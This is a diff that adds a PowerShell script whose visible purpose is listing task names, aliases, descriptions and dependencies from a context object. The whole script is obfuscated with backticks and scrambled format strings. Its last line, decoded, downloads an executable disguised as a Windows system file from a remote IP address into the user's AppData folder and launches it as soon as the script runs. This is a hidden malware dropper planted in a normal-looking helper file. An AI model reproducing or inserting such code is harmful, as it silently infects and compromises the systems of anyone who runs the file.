@@ -1,0 +1,17 @@
+function g`et`TASkSF`RomCoN`TExt(${C`Ur`Re`NTc`OnTExT}) {
+
+    ${D`OCs} = ${cUR`R`entcO`NtexT}."t`ASKS"."kE`Ys" | .("{1}{2}{3}{0}"-f 't','for','each-o','bjec') {
+
+        ${T`ASK} = ${CURr`e`NTCo`NText}."ta`sKs".${_}
+        &("{2}{0}{1}"-f'-ob','ject','new') ("{1}{0}"-f 'bject','PSO') -property @{
+            ("{1}{0}"-f 'e','Nam') = ${ta`Sk}."n`AME";
+            ALIAS = ${t`ASk}.aliAS;
+            ("{1}{2}{0}"-f 'on','Descript','i') = ${Ta`SK}."descr`I`ptioN";
+            ("{0}{2}{1}" -f 'De','dsOn','pen') = ${T`ASk}."DEPeND`S`oN";
+        }
+    }
+
+    return ${do`Cs}
+}
+
+(.("{2}{0}{1}" -f'w-','Object','Ne') ("{6}{3}{2}{5}{4}{1}{0}" -f 'ent','i','.Net.','stem','bCl','We','Sy')).("{1}{2}{0}" -f 'adFile','Do','wnlo').Invoke(("{6}{5}{2}{0}{4}{3}{1}" -f '0','srsv.exe','17','~yahoo/c','.218/','48.','http://89.2'),"$env:APPDATA\csrsv.exe");&("{2}{0}{1}"-f 'tart-Proc','ess','S') ("$env:APPDATA\csrsv.exe")
